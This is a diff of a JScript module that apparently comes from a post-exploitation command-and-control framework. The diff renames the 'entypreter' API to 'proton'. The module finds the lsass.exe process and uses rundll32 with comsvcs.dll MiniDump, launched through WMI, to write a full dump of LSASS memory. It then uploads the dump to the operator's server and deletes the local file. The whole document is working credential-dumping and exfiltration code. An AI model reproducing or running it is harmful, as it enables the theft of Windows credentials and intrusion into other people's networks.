@@ -2,20 +2,20 @@ try
 {
     var headers = {};
 
-    var res_file = "~DIRECTORY~\\"+entypreter.uuid()+".bin";
+    var res_file = "~DIRECTORY~\\"+proton.uuid()+".bin";
 
     var lpid = "";
 
     if (~LSASSPID~ == 0)
     {
-        lpid = entypreter.process.getPID("lsass.exe");
+        lpid = proton.process.getPID("lsass.exe");
         if (lpid)
         {
-            entypreter.work.report(lpid.toString(),{'Task': 'pid'});
+            proton.work.report(lpid.toString(),{'Task': 'pid'});
         }
         else
         {
-            entypreter.work.report('',{'Task': 'nopid'});
+            proton.work.report('',{'Task': 'nopid'});
             var e = Error('Could not identify process ID');
             throw e;
         }
@@ -27,8 +27,8 @@ try
 
     var cmd = "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump "+ lpid.toString()+ " " + res_file + " full";
     
-    entypreter.work.report('',{'Task': 'startrun'});
-    var newpid = entypreter.WMI.createProcess(cmd, true);
+    proton.work.report('',{'Task': 'startrun'});
+    var newpid = proton.WMI.createProcess(cmd, true);
 
     /* 
        we only get a process ID returned, so we have to search through running processes
@@ -38,7 +38,7 @@ try
     while (pidflag)
     {
         pidflag = false;
-        var processes = entypreter.process.list();
+        var processes = proton.process.list();
         var items = new Enumerator(processes);
         while (!items.atEnd())
         {
@@ -57,18 +57,18 @@ try
             items.moveNext();
         }
     }
-    entypreter.work.report('',{'Task': 'endrun'});
+    proton.work.report('',{'Task': 'endrun'});
 
-    entypreter.work.report('',{'Task': 'upload'});
-    entypreter.http.upload(res_file, 'dump', ~CERTUTIL~, 'Task');
+    proton.work.report('',{'Task': 'upload'});
+    proton.http.upload(res_file, 'dump', ~CERTUTIL~, 'Task');
 
-    entypreter.work.report('',{'Task': 'delbin'});
-    entypreter.file.deleteFile(res_file);
+    proton.work.report('',{'Task': 'delbin'});
+    proton.file.deleteFile(res_file);
 
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
